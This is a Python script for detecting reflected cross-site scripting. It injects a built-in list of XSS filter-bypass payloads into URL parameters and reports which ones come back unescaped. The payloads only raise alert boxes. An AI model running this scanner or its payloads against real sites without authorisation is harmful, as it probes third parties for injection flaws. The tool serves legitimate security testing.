#!/usr/bin/env python3
"""
XSS Scanner — Reflected XSS Detector
Author: Hiro
Usage: python xss_scanner.py -u "https://target.com/search?q=test"
       python xss_scanner.py -u "https://target.com/search?q=test" -p payloads.txt
"""

import requests
import argparse
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime

# ── ANSI Colors ───────────────────────────────────────────────────────────────
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
GREY   = "\033[90m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

# ── Built-in payload list ─────────────────────────────────────────────────────
# These are common XSS payloads pentesters use
# Each one is a different technique to bypass filters
DEFAULT_PAYLOADS = [
    # Basic script tag
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",

    # Case variation — bypass dumb filters that only block lowercase
    "<SCRIPT>alert(1)</SCRIPT>",
    "<Script>alert(1)</Script>",

    # Event handlers — works when script tags are blocked
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",

    # Without quotes — bypass filters that strip quotes
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert(1)>",

    # HTML encoded — bypass basic encoding checks
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

    # JavaScript protocol
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",

    # Filter bypass with broken tags
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<sc\ript>alert(1)</sc\ript>",

    # Polyglot — works in multiple contexts
    "javascript:/*--></title></style></textarea></script></xmp>"
    "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
]

# ── Banner ────────────────────────────────────────────────────────────────────
def print_banner():
    print(f"""
{RED}{BOLD}
  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║
   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{RESET}{GREY}  Reflected XSS Scanner — Educational Use Only
{RESET}""")

# ── URL helpers ───────────────────────────────────────────────────────────────
def get_parameters(url):
    """Extract query parameters from a URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    # Flatten — parse_qs returns lists, we want single values
    return {k: v[0] for k, v in params.items()}

def inject_payload(url, param, payload):
    """Replace a specific parameter's value with the payload."""
    parsed   = urlparse(url)
    params   = parse_qs(parsed.query, keep_blank_values=True)
    params   = {k: v[0] for k, v in params.items()}

    # Inject payload into the target parameter
    params[param] = payload

    # Rebuild the URL
    new_query = urlencode(params)
    new_url   = urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))
    return new_url

def is_vulnerable(response_text, payload):
    """
    Check if the payload appears unescaped in the response.
    A proper site would encode < as &lt; and > as &gt;
    If we see the raw payload — it's vulnerable.
    """
    return payload in response_text

# ── Core scanner ──────────────────────────────────────────────────────────────
def scan_parameter(url, param, payloads, session, timeout, verbose):
    """Test a single parameter with all payloads."""
    vulnerabilities = []

    print(f"\n  {CYAN}[*] Testing parameter:{RESET} {BOLD}{param}{RESET}")
    print(f"  {GREY}{'─' * 55}{RESET}")

    for i, payload in enumerate(payloads, 1):
        test_url = inject_payload(url, param, payload)

        try:
            resp = session.get(test_url, timeout=timeout)

            if is_vulnerable(resp.text, payload):
                print(f"  {RED}{BOLD}[VULNERABLE]{RESET}  Payload #{i} reflected unescaped!")
                print(f"  {YELLOW}  Payload  :{RESET} {payload}")
                print(f"  {YELLOW}  Test URL :{RESET} {test_url}\n")
                vulnerabilities.append({
                    "param":   param,
                    "payload": payload,
                    "url":     test_url
                })
                # Found one — no need to spam more for this param
                # Comment this break if you want ALL payloads tested
                break
            else:
                if verbose:
                    print(f"  {GREY}[SAFE #{i}]{RESET}  {payload[:50]}...")

        except requests.exceptions.Timeout:
            print(f"  {YELLOW}[TIMEOUT]{RESET}  Request timed out")
        except requests.exceptions.ConnectionError:
            print(f"  {RED}[ERROR]{RESET}  Could not connect to target")
            break
        except Exception as e:
            print(f"  {RED}[ERROR]{RESET}  {e}")

    if not vulnerabilities:
        print(f"  {GREEN}[SAFE]{RESET}  Parameter '{param}' appears protected\n")

    return vulnerabilities

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="XSS Scanner — Reflected XSS Detector",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        help='Target URL with parameter(s)\nExample: "https://target.com/search?q=test"'
    )
    parser.add_argument(
        "-p", "--payloads",
        default=None,
        help="Path to custom payloads file (one payload per line)\nDefault: built-in payload list"
    )
    parser.add_argument(
        "--param",
        default=None,
        help="Test only a specific parameter (default: test all)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "--user-agent",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        help="Custom User-Agent string"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Show safe payloads too (not just vulnerabilities)"
    )
    args = parser.parse_args()

    # ── Load payloads ─────────────────────────────────────────────────────────
    if args.payloads:
        try:
            with open(args.payloads, "r", encoding="utf-8", errors="ignore") as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            print(f"  {GREEN}[+]{RESET} Loaded {len(payloads)} payloads from {args.payloads}")
        except FileNotFoundError:
            print(f"  {RED}[!] Payload file not found: {args.payloads}{RESET}")
            sys.exit(1)
    else:
        payloads = DEFAULT_PAYLOADS
        print(f"  {CYAN}[*]{RESET} Using {len(payloads)} built-in payloads")

    # ── Parse target URL ──────────────────────────────────────────────────────
    params = get_parameters(args.url)

    if not params:
        print(f"\n  {RED}[!] No parameters found in URL.{RESET}")
        print(f"  {YELLOW}    Make sure your URL has parameters like: ?q=test or ?id=1{RESET}\n")
        sys.exit(1)

    # Filter to specific param if requested
    if args.param:
        if args.param not in params:
            print(f"\n  {RED}[!] Parameter '{args.param}' not found in URL.{RESET}\n")
            sys.exit(1)
        params = {args.param: params[args.param]}

    # ── Print scan info ───────────────────────────────────────────────────────
    print(f"\n  {BOLD}Target    :{RESET} {args.url}")
    print(f"  {BOLD}Parameters:{RESET} {list(params.keys())}")
    print(f"  {BOLD}Payloads  :{RESET} {len(payloads)}")
    print(f"  {BOLD}Started   :{RESET} {datetime.now().strftime('%H:%M:%S')}")

    # ── Session setup ─────────────────────────────────────────────────────────
    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept":     "text/html,application/xhtml+xml,*/*",
    })

    # ── Scan each parameter ───────────────────────────────────────────────────
    all_vulnerabilities = []

    for param in params:
        results = scan_parameter(
            args.url, param, payloads,
            session, args.timeout, args.verbose
        )
        all_vulnerabilities.extend(results)

    # ── Final summary ─────────────────────────────────────────────────────────
    print(f"  {GREY}{'─' * 55}{RESET}")
    print(f"\n  {BOLD}Scan complete — {datetime.now().strftime('%H:%M:%S')}{RESET}\n")

    if all_vulnerabilities:
        print(f"  {RED}{BOLD}⚠  {len(all_vulnerabilities)} vulnerability(s) found:{RESET}\n")
        for v in all_vulnerabilities:
            print(f"  {RED}[XSS]{RESET}  Parameter : {BOLD}{v['param']}{RESET}")
            print(f"         Payload   : {v['payload']}")
            print(f"         URL       : {v['url']}\n")
        print(f"  {YELLOW}Tip: Open the test URL in a browser to confirm the popup fires.{RESET}\n")
    else:
        print(f"  {GREEN}{BOLD}✓  No reflected XSS found.{RESET}")
        print(f"  {GREY}  Note: This doesn't mean 100% safe — stored/DOM XSS needs manual testing.{RESET}\n")

if __name__ == "__main__":
    main()